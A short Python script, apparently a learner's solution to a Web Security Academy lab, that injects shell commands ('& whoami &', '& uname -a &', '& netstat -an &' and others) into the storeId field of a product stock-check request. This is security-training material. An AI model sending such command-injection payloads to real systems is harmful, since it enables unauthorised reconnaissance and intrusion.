import requests

s = requests.Session()
url = "https://0ab1000904ed1bc381a4f765009800fe.web-security-academy.net"

# PAYLOADS
# LAB 01
payload_1 = "& whoami &"
payload_2 = "& uname -a &"
payload_3 = "& ifconfig &"
payload_4 = "& netstat -an &"
payload_5 = "& ps -ef &"

# POST na checagem de itens de estoque do produto
data = {
    "productId": "2", 
    "storeId": f"3{payload_1}"
}
response = s.post(url=f"{url}/product/stock", data=data)
print(response.text)